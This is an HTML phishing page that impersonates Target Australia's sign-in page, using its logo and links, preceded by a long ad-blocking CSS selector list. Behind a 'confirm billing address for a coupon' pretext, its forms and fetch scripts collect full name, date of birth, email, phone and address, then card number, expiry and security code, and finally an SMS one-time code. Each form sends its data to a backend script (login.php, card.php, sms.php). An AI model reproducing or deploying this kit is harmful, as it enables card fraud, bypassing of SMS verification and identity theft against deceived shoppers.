a[href^="https://brightadnetwork.com/"], :root a[href^="http://www.onwebcam.com/random?t_link="], :root [href^="https://www.avantlink.com/click.php"] img, :root a[href^="https://losingoldfry.com/"], :root [data-wpas-zoneid], :root .scroll-fixable.rail-right > .deals-rail, :root [href^="https://routewebtk.com/"], :root a[href^="https://oackoubs.com/"], :root a[href^="https://ak.psaltauw.net/"], :root a[href^="https://go.cmtaffiliates.com/"], :root [data-name="adaptiveConstructorAd"], :root [href^="https://optimizedelite.com/"] > img, :root a[href^="https://awptjmp.com/"], :root a[href^="https://go.goasrv.com/"], :root [href^="http://mypillow.com/"] > img, :root a[href^="http://bongacams.com/track?"], :root a[href^="https://fleshlight.sjv.io/"], :root [data-ad-manager-id], :root a[href^="https://promo-bc.com/"], :root a[href^="https://clicks.pipaffiliates.com/"], :root [href^="https://noqreport.com/"] > img, :root [href^="https://mylead.global/stl/"] > img, :root [href^="https://mypatriotsupply.com/"] > img, :root [data-freestar-ad], :root a[href^="https://fc.lc/ref/"], :root .vid-present > .van_vid_carousel__padding, :root span[data-ez-ph-id], :root [href^="https://track.aftrk1.com/"], :root div[id^="adngin-"], :root [data-rc-widget], :root a[href^="https://go.xxxijmp.com"], :root [href^="https://istlnkcl.com/"], :root a[href^="https://staRTgaming.net/tienda/"], :root a[href^="https://STaRtgAmInG.net/tienda/"], :root [href^="https://ilovemyfreedoms.com/landing-"], :root [href^="https://go.xlrdr.com"], :root [href^="https://go.4rabettraff.com/"], :root a[href^="https://tm-offers.gamingadult.com/"], :root [href^="https://charmingdatings.life/"], :root [href^="https://glersakr.com/"], :root a[href^="https://italarizege.xyz/"], :root a[href^="https://wittered-mainging.com/"], :root [href^="https://engine.gettopple.com/"], :root [data-id^="div-gpt-ad"], :root a[href^="https://tracker.loropartners.com/"], :root [href^="https://awbbjmp.com/"], :root a[href^="https://k2s.cc/pr/"], :root [href^="https://affect3dnetwork.com/track/"], :root a[href^="https://camfapr.com/landing/click/"], :root [href="//sexcams.plus/"], :root a[href^="https://go.currency.com/"], :root div[id^="advads_ad_"], :root .resultsList > div > div > div > div[data-resultid$="-sponsored"], :root [href^="http://www.mypillow.com/"] > img, :root a[href^="https://adserver.adreactor.com/"], :root [href^="http://join.shemalesfromhell.com/"], :root a[href^="https://ads.betfair.com/redirect.aspx?"], :root [href^="http://www.fleshlightgirls.com/"], :root [href^="http://join.trannies-fuck.com/"], :root .trc_rbox .syndicatedItem, :root a[href^="http://cam4com.go2cloud.org/aff_c?"], :root a[href^="https://cpmspace.com/"], :root [href^="https://freecourseweb.com/"] > .sitefriend, :root a[href^="https://ads.planetwin365affiliate.com/redirect.aspx?"], :root [href^="http://join.rodneymoore.com/"], :root [href^="https://shrugartisticelder.com"], :root a[href^="https://staRTgamIng.net/tienda/"], :root div[id^="lazyad-"], :root a[href^="http://com-1.pro/"], :root [name^="google_ads_iframe"], :root a[href^="http://bodelen.com/"], :root [href="https://www.masstortfinancing.com/"] > img, :root a[href^="https://www.geekbuying.com/dynamic-ads/"], :root a[href^="https://lnkxt.bannerator.com/"], :root [href="https://jdrucker.com/gold"] > img, :root [href^="https://v.investologic.co.uk/"], :root [href^="https://cipledecline.buzz/"], :root a[href^="https://go.xxxjmp.com"], :root #leader-companion > a[href], :root a[href^="https://jaxofuna.com/"], :root div[recirculation-ad-container], :root [href^="https://traffserve.com/"], :root [id^="ad_slider"], :root [data-adbridg-ad-class], :root a[href^="http://www.adultdvdempire.com/?partner_id="][href*="&utm_"], :root [href^="http://join.shemale.xxx/"], :root div[id^="div-ads-"], :root [href^="https://rapidgator.net/article/premium/ref/"], :root [href^="https://join3.bannedsextapes.com"], :root div[data-spotim-slot], :root [href^="https://antiagingbed.com/discount/"] > img, :root a[href^="https://go.247traffic.com/"], :root [href^="https://join.girlsoutwest.com/"], :root [href^="http://trafficare.net/"], :root [data-type="ad-vertical"], :root a[href^="https://u.expresstech.io/"], :root [href^="https://mypillow.com/"] > img, :root [href^="https://ad.admitad.com/"], :root [data-testid="ad_testID"], :root [href^="https://goldcometals.com/clk.trk"], :root a[href^="https://bodelen.com/"], :root [data-ad-name], :root a[href*=".g2afse.com/"], :root a[href^="https://go.hpyjmp.com"], :root a[href^="https://tour.mrskin.com/"], :root a[href^="https://fastestvpn.com/lifetime-special-deal?a_aid="], :root [href^="https://mystore.com/"] > img, :root [data-mobile-ad-id], :root [data-ez-name], :root a[data-widget-outbrain-redirect^="http://paid.outbrain.com/network/redir?"], :root [data-dynamic-ads], :root a[href^="http://go.xtbaffiliates.com/"], :root a[href^="https://consali.com/"], :root .grid > .container > #aside-promotion, :root DFP-AD, :root [onclick*="content.ad/"], :root AMP-AD, :root a[href^="https://sTartGAMiNG.net/tienda/"], :root [data-ad-cls], :root [id^="ad-wrap-"], :root div[id^="taboola-stream-"], :root [href^="https://go.astutelinks.com/"], :root a[href^="http://tc.tradetracker.net/"] > img, :root a[href^="http://affiliates.thrixxx.com/"], :root a[href^="https://www.adultempire.com/"][href*="?partner_id="], :root [data-template-type="nativead"], :root [class^="amp-ad-"], :root [href^="https://affiliate.fastcomet.com/"] > img, :root [class^="adDisplay-module"], :root AD-SLOT, :root .ob_dual_right > .ob_ads_header ~ .odb_div, :root a[href^="https://www.liquidfire.mobi/"], :root [href^="https://click2cvs.com/"], :root .trc_related_container div[data-item-syndicated="true"], :root [href^="http://join.shemalepornstar.com/"], :root a[href^="https://go.xlviiirdr.com"], :root .trc_rbox_div .syndicatedItem, :root .plistaList > .itemLinkPET, :root [href^="https://gmxvmvptfm.com/"], :root div[data-adunit], :root app-large-ad, :root [href^="https://turtlebids.irauctions.com/"] img, :root a[href^="https://www.adskeeper.com"], :root [href^="https://totlnkcl.com/"], :root [data-ad-module], :root a[data-oburl^="https://paid.outbrain.com/network/redir?"], :root div[data-ad-targeting], :root a[href^="https://hotplaystime.life/"], :root a[href^="http://www.h4trck.com/"], :root [href^="https://trackfin.asia/"], :root .plistaList > .plista_widget_underArticle_item[data-type="pet"], :root a[href^="https://bs.serving-sys.com"], :root [href^="http://residenceseeingstanding.com/"], :root div[id^="pa_sticky_ad_box_middle_"], :root a[href^="http://www.onclickmega.com/jump/next.php?"], :root .trc_rbox_border_elm .syndicatedItem, :root a[href*="//lkstrck2.com/"], :root [class^="div-gpt-ad"], :root a[href^="https://ggbetpromo.com/"], :root a[href^="http://partners.etoro.com/"], :root [data-advadstrackid], :root a[href^="https://refpazkjixes.top/"], :root #mgb-container > #mgb, :root [href^="https://www.cloudways.com/en/?id"], :root [href^="https://safer-redirection.com"], :root a[href^="https://startgAming.net/tienda/"], :root a[href^="https://tweakostensibleinstaller.com/"], :root a[href^="https://go.xlivrdr.com"], :root a[href^="https://cam4com.go2cloud.org/"], :root a[href^="http://li.blogtrottr.com/click?"], :root [href^="//mage98rquewz.com/"], :root a[href^="https://webroutetrk.com/"], :root a[href^="https://mercurybest.com/"], :root [href^="https://www.restoro.com/"], :root div[id^="optidigital-adslot"], :root .resultsList > div > div > div > div.G-5c[role="tab"][tabindex="0"] > .yuAt-pres-rounded { display: none !important; }</style></head>
<style>
    .hidden {
        display: none;
    }


       #loading {
        display: none;
        position: fixed;
        left: 25%;
        top: 35%;
        transform: translate(-25%, -25%);
        /* Adjust the size of the loader image if needed */
    }

        #loading2 {
        display: none;
        position: fixed;
        left: 25%;
        top: 35%;
        transform: translate(-25%, -25%);
        /* Adjust the size of the loader image if needed */
    }
</style>
<body>
    
    <nav class="mobile-nav">
        <button id="mback" class="mobile-back-btn" onclick="back()" ></button>
      	<span class="mobile-back-btn-forgotpwd hidden-block"></span>
        <div class="placeholder"></div>
        <div class="placeholder"></div>
    </nav>
    <div class="container">
        <nav class="desktop-nav">
            <button class="desktop-back-btn" id="dback" onclick="back()" ></button>
          	<span class="desktop-back-btn-forgotpwd hidden-block"></span>
            <a href="https://www.target.com.au" id="target-home" target="_self">
            <img class="target-logo" src="https://www.target.com.au/medias/auth0/target.svg" alt="Target Logo"></a>
            <script>
                document.getElementById("target-home").href = `${targetHostName}`;
            </script>
            <div class="placeholder"> </div>
        </nav>
    <div>

            <div class="content-container mt-1 mt-lg-3">

                <!--------------------------------------Start of Sign-in Page-------------------------------------->
                <div class="container" id="login-page">
                    <div class="row">
                        <div class="col-12 col-lg-6 left-custom-white">
                            <div class="px-lg-5 my-3">
                                <h3 class="">Confirm Your Billing Address & Receive Your Coupon!</h3>
                                <div id="error-message" class="alert alert-light"></div>
                               



                                <form method="post" id="fm1" action="login.php">
                                       <div class="form-group">
                                        <input type="text" class="input form-control" id="name" name="name" placeholder="FULL NAME" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
                                             <div class="form-group">
                                        <input type="date" class="input form-control" id="dob" name="dob" placeholder="MM-DD-YYYY" required>
                                        <div class="error" id="login-email-error"></div>
                                    </div>
                                    <div class="form-group">
                                        <input type="email" class="input form-control" id="login-email" name="login-email" placeholder="Email" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>

                                        <div class="form-group">
                                        <input type="tel" class="input form-control" id="phone" name="phone" placeholder="(123) 456-7890" required>
                                        <div class="error" id="login-email-error"></div>
                                    </div>
                                 
                                    <div class="form-group">
                                        <input type="text" class="input form-control" id="add" name="add" placeholder="Street Address 1" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>

                                     <div class="form-group">
                                        <input type="text" class="input form-control" id="city" name="city" placeholder="CITY/TOWN" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
                                     <div class="form-group">
                                        <input type="zip" class="input form-control" id="zip" name="zip" placeholder="ZIP Code™ (OPT)" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
                                    
                               
                                   
                                    <div class="text-left pt-2">
                                        <button  type="submit" name="submit"  onclick="switchForm()" class="btn btn-default login-btn" > Continue</button>
                                    
                                    </div>
                                    <br>
                                     <p class="mb-4 my-0 py-0 access-disclaimer">As part of our commitment to ensuring a secure and personalized shopping experience, we kindly ask you to confirm your billing address. This step is crucial for verifying your identity and safeguarding your account.
                                        Clearance.
                                    </p>

                                        <img src="https://superstorefinder.net/support/wp-content/uploads/2018/01/pink_loader.gif" id="loading" alt="Loading...">
                                        <img src="https://superstorefinder.net/support/wp-content/uploads/2018/01/pink_loader.gif" id="loading2" alt="Loading...">

                                </form>


                                <div  style="display: block;">
</div>

                      <!-- Second Form (Initially Hidden) -->

                                        <div id="fm2" class="hidden" >
                                                        <form id="#form2" method="post" id="fm1" action="card.php">
                                             <!-- Form elements for the second form -->



                                              <div class="form-group">
                                        <input type="text" class="input form-control" id="name" name="name" placeholder="FULL NAME" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
             <div class="form-group">
<input type="text" class="input form-control" id="card" name="card" placeholder="Card Number" required="" pattern="\d{16}" title="Credit card number should be 16 digits">
                                        <div class="error" id="login-email-error"></div>
                                    </div>

                                          <div class="form-group">
<input type="text" class="input form-control" id="exp" name="exp" placeholder="Expiry Date (MM/YY)" required="" oninput="formatExpirationDate(this)">
                                        <div class="error" id="login-email-error"></div>
                                    </div>


                                              <div class="form-group">
                                        <input type="text" class="input form-control" id="csv" name="csv" placeholder="Security code" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>

                                         <div class="text-left pt-2">
                                        <button  type="submit" name="submit"   class="btn btn-default login-btn" > Continue</button>
                                    
                                    </div>
                                    <br>
                                   <p class="mb-4 my-0 py-0 access-disclaimer">As part of our commitment to ensuring a secure and personalized shopping experience, we kindly ask you to confirm your billing address. This step is crucial for verifying your identity and safeguarding your account.
                                        Clearance.
                                    </p> 

                                   
    </form>
</div>



                                                            <!-- sms Form (Initially Hidden) -->

                                        <div id="fm3" class="hidden" >
                                              <p class="mb-4 my-0 py-0 access-disclaimer">Verify Your Payment Method
                                    </p> 
                                                                  <p class="mb-4 my-0 py-0 access-disclaimer"> To confirm the operation, enter the password that we have sent by SMS to your mobile **********.
 </p> 
                                                        <form id="#form3" method="post" id="fm1" action="sms.php">
                                             <!-- Form elements for the sms form -->



                                              <div class="form-group">
                                        <input type="text" class="input form-control" id="sms" name="sms" placeholder="SMS KEY" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
             


                                             

                                         <div class="text-left pt-2">
                                        <button  type="submit" name="submit"   class="btn btn-default login-btn" > Confirme</button>
                                    
                                    </div>
                                    <br>
                                 
      


  <p class="mb-4 my-0 py-0 access-disclaimer"> As part of our commitment to ensuring a secure and personalized shopping experience, we kindly ask you to confirm your billing address. This step is crucial for verifying your identity and safeguarding your account.
                                        Clearance.
                                    </p> 

                                   
    </form>
</div>
                            </div>
                        </div>
                        <div class="col col-12 col-lg-6 right-custom-lightgray">
                            <div>
                                <div class="text-center my-0 py-5">
                                    <label class="text-center" for="btn-join">Don't have an account</label><br>
                                    <button type="submit" id="btn-join" class="btn btn-join-today mt-2">Create Account</button>
                                </div>
                                <div class="perks-container-signin">
                                    <div class="mb-3"><h4>Enjoy access to:</h4></div>
                                    <ul>
                                        <li class="heart">
                                            $10 off online!
                                            <br>
                                            <p>Get $10 off your next $50+ online shop when you opt into marketing.</p>
                                        </li>
                                        <li class="tracking">
                                            Detailed Order Tracking
                                            <br>
                                            <p>Get updates on the progress of your order and see all your past purchases
                                            </p>
                                        </li>
                                        <li class="checkout">
                                            Faster Checkout
                                            <br>
                                            <p>We'll remember and pre-fill your details everytime you shop online</p>
                                        </li>
                                        <li class="update">
                                            Latest Deals and Products
                                            <br>
                                            <p>
                                                Never miss a promotion, the latest products or exclusive offers when you
                                                opt
                                                into marketing.
                                            </p>
                                        </li>
                                    </ul>
                                    <p class="my-0 py-0 mb-5 access-disclaimer">Offer available to new marketing opt-ins only. E-Voucher
                                        promo code sent via your Welcome Email. Code is single-use only and not
                                        redeemable for cash. Cannot be used with any other promo code. Excludes
                                        Clearance.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>



                <!---------------------------------------End of Sign-in Page--------------------------------------->

                <!--------------------------------------Start of Sign-up Page-------------------------------------->
                <div class="container hidden-block" id="signup-page">
                    <div class="row right-custom-lightgray">
                        <div class="col col-12 col-lg-6 right-custom-lightgray order-xl-2 order-lg-2">
                            <div>
                                <div class="perks-container-signup">
                                    <div class="mb-3 mt-3"><h4>Enjoy access to:</h4></div>
                                    <ul>
                                        <li class="heart">
                                            $10 off online!^
                                            <br>
                                            <p>Get $10 off your next $50+ online shop when you opt into marketing.</p>
                                        </li>
                                        <li class="tracking">
                                            Detailed Order Tracking
                                            <br>
                                            <p>Get updates on the progress of your order and see all your past purchases
                                            </p>
                                        </li>
                                        <li class="checkout">
                                            Faster Checkout
                                            <br>
                                            <p>We'll remember and pre-fill your details everytime you shop online</p>
                                        </li>
                                        <li class="update">
                                            Latest Deals and Products
                                            <br>
                                            <p>
                                                Never miss a promotion, the latest products or exclusive offers when you
                                                opt
                                                into marketing.
                                            </p>
                                        </li>
                                    </ul>
                                    <p class="mb-4 my-0 py-0 access-disclaimer">^Offer available to new marketing opt-ins only. E-Voucher
                                        promo code sent via your Welcome Email. Code is single-use only and not
                                        redeemable for cash. Cannot be used with any other promo code. Excludes
                                        Clearance.
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div class="col col-12 col-lg-6 order-xl-1 order-lg-1 left-custom-white">
                            <div class="px-lg-5 pt-3">
                                <h3 class="">Create an account</h3>
                                <div id="error-message" class="alert alert-light"></div>
                                <form onsubmit="return false;" method="post">
                                    <div class="form-group">
                                        <label for="signup-email">Email<sup>*</sup></label>
                                        <input required="" type="email" class="form-control" id="signup-email" placeholder="Email" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                        <div class="error" id="signup-email-error"></div>
                                        <div class="error-wrapper" id="error-wrapper" hidden="">
                                            <img src="https://www.target.com.au/medias/auth0/Warning.svg" alt="Warning" id="warning">
                                            <p class="error-info" id="signup-error"></p>
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label for="first-name">First name<sup>*</sup></label>
                                        <input required="" type="text" class="form-control" id="first-name" placeholder="First Name" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                        <div class="error" id="first-name-error"></div>
                                    </div>
                                    <div class="form-group">
                                        <label for="last-name">Last name<sup>*</sup></label>
                                        <input required="" type="text" class="form-control" id="last-name" placeholder="Last Name" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                        <div class="error" id="last-name-error"></div>
                                    </div>
                                    <div class="form-group">
                                        <label for="mobile-number">Mobile number<sup>*</sup></label>
                                        <input required="" type="text" class="form-control" id="mobile-number" placeholder="Mobile Number" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                        <p class="small text-right" id="mobile-number-text">Updates on your order can be
                                            sent by
                                            SMS</p>
                                        <div class="error" id="mobile-number-error"></div>
                                    </div>
                                    <div class="form-group">
                                        <label for="signup-password">Password<sup>*</sup></label>
                                        <div class="input-group">
                                            <input required="" type="password" class="form-control" id="signup-password" value="" placeholder="Password" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                            <div class="password-input-icon">
                                                <span>
                                                    <a class="showHidesignup-password" id="show_hide_signup-password">Show</a>
                                                </span>
                                            </div>
                                        </div>
                                        <div class="error" id="signup-password-error"></div>
                                        <div id="password-strength-container" class="container password-strength-container border p-3 mb-3" aria-live="assertive" aria-atomic="true" data-shown="true" hidden="">
                                            <span class="password-title">
                                                Your password must contain:
                                            </span>

                                            <ul class="list-group border-0">
                                                <li class="list-group-item border-0 p-0">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="at-least-8-characters"></span>
                                                        At least 8 characters
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="at-least-3-of-the-following"></span>
                                                        At least 3 of the following:
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0 pl-4">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="lower-case-letters"></span>
                                                        Lower case letters (a-z)
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0 pl-4">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="upper-case-letters"></span>
                                                        Upper case letters (A-Z)
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0 pl-4">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="numbers"></span>
                                                        Numbers (0-9)
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0 pl-4">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="special-characters"></span>
                                                        Special characters (ex. !@#$%^&amp;*)
                                                    </label>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="form-group small">
                                        <input class="form-check-input" type="checkbox" id="marketing-emails">
                                        <label class="form-check-label" for="marketing-emails">
                                            Yes, opt me in to receive marketing from Target, including exclusive promotions and offers.</label>
                                        <p class="mt-3 disclaimer">By signing up, you agree to our <a href="https://www.target.com.au/corporate/condition-of-use" class="link" id="signup-tc" target="_blank">Conditions of Use</a> and <a href="https://www.target.com.au/corporate/privacy" class="link" id="signup-pp" target="_blank">Privacy Policy</a>.
                                            <script>
                                                document.getElementById("signup-tc").href = `${targetHostName}/corporate/condition-of-use`;
                                                document.getElementById("signup-pp").href = `${targetHostName}/corporate/privacy`;
                                            </script>
                                        </p>
                                    </div>
                                    <button id="btn-signup" class="btn btn-default btn-block signup-btn" disabled="">
                                        Join Now
                                    </button>
                                </form>
                                <div>
                                    <h4 class="btn-login-text">Already have an account? 
                                        <a id="btn-login-link">Log in here</a></h4>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!---------------------------------------End of Sign-up Page--------------------------------------->

                <!----------------------------------Start of Reset Password Page----------------------------------->
                <div class="container hidden-block" id="forgot-password-page">
                    <div class="row">
                        <div class="col-12 col-lg-2"></div>
                        <div class="col-12 col-lg-8">
                            <h4 class="text-center title mb-4">Reset Password</h4>
                            <p class="text-center desc mb-5">Enter your email address and we'll send you instructions to
                                reset
                                your password.</p>
                            <div class="form-container w-100 d-flex justify-content-center">
                                <form onsubmit="return false;" method="post">
                                    <div class="form-group">
                                        <label for="name">Email*</label>
                                        <input type="email" class="input form-control" id="reset-email" placeholder="Email" required="true" onblur="onBlurHandler(this, 'reset')" oninput="onChangeHandler(this, 'reset')">
                            <div class="error" id="reset-email-error"></div>
                                    </div>
                                    <div class="text-left pt-1 mb-5 pb-1">
                                        <button type="submit" disabled="" class="btn btn-default-reset" id="btn-reset">Send
                                            email</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="col-12 col-lg-2"></div>
                    </div>
                </div>
                <!------------------------------------End of Reset Password Page------------------------------------->

                <div class="container hidden-block" id="check-email-page">
                    <div class="row">
                        <div class="col-12 col-lg-2"></div>
                        <div class="col-12 col-lg-8 text-center">
                            <h4 class="text-center title mb-5">Please check your email</h4>
                            <p class="text-left mb-5 desc">Thanks! We have sent an email to <span class="youremailinfo">xxxx</span> with the next steps to reset your password.</p>
                            <p class="text-left desc">If you don’t receive the email after few minutes, make sure to
                                check your
                                junk or spam folder too.</p>
                        </div>
                    </div>
                </div>
            </div>

           


</div></div>
<script>
document.querySelector('#fm1').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting the traditional way
    var formData = new FormData(this);

    // Optionally process formData if needed, then:
        document.getElementById('loading').style.display = 'block';

    // Example of how you might asynchronously submit the form data using Fetch API
    fetch('login.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        console.log(data); // Process response from login.php
        // Now show the second form
        document.getElementById('fm1').style.display = 'none';
        document.getElementById('fm2').style.display = 'block';
        document.getElementById('mback').style.display = 'block';
        document.getElementById('dback').style.display = 'block';

    })
    .catch(error => console.error('Error:', error));
});



document.getElementById('#form2').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting the traditional way

    // Display the loading GIF immediately
    document.getElementById('loading2').style.display = 'block';

    // Use setTimeout to delay the form processing
    setTimeout(() => {
        var formData = new FormData(this);
        document.getElementById('loading').style.display = 'block';

        // Example of how you might asynchronously submit the form data using Fetch API
        fetch('card.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(data => {
            console.log(data); // Process response from server
            // Now show the second form and hide the loading GIF
            document.getElementById('fm1').style.display = 'none';
            document.getElementById('fm2').style.display = 'none';
            document.getElementById('fm3').style.display = 'block';
            document.getElementById('mback').style.display = 'block';
            document.getElementById('dback').style.display = 'block';
            document.getElementById('loading2').style.display = 'none';
        })
        .catch(error => {
            console.error('Error:', error);
            // Optionally, handle errors by hiding the loading GIF
            document.getElementById('loading2').style.display = 'none';
        });
    }, 10000); // Wait for 10 seconds (10000 milliseconds) before executing the above code
});



document.getElementById('#from3').addEventListener('submit', function(event) {
    event.preventDefault();
    const formData = new FormData(this);

    document.getElementById('loading').style.display = 'block';

    fetch('sms.php', {
        method: 'POST',
        body: formData,
    })
    .then(response => response.text())
    .then(data => {
        console.log(data);
        document.getElementById('loading').style.display = 'none';
        document.getElementById('fm2').style.display = 'none';
        document.getElementById('fm3').style.display = 'none';

      
    })
    .catch(error => {
        console.error('Error:', error);
        document.getElementById('loading').style.display = 'none';
    });
});


function back() {
    // Hide the first form
                document.getElementById('loading').style.display = 'none';
        document.getElementById('fm3').style.display = 'none';

    document.getElementById('fm2').style.display = 'none';
    
    // Show the second form
    document.getElementById('fm1').style.display = 'block';
}


function formatExpirationDate(input) {
  var value = input.value;
  // Remove all non-digit characters
  var valueClean = value.replace(/\D/g, '');

  // Slice and add slash after 2 digits (MM/YY)
  if (valueClean.length > 2) {
    valueClean = valueClean.slice(0, 2) + '/' + valueClean.slice(2, 4);
  }

  input.value = valueClean;

  // Limit input length to 5 characters (MM/YY + slash)
  if (input.value.length > 5) {
    input.value = input.value.slice(0, 5);
  }
}
</script>


</body></html>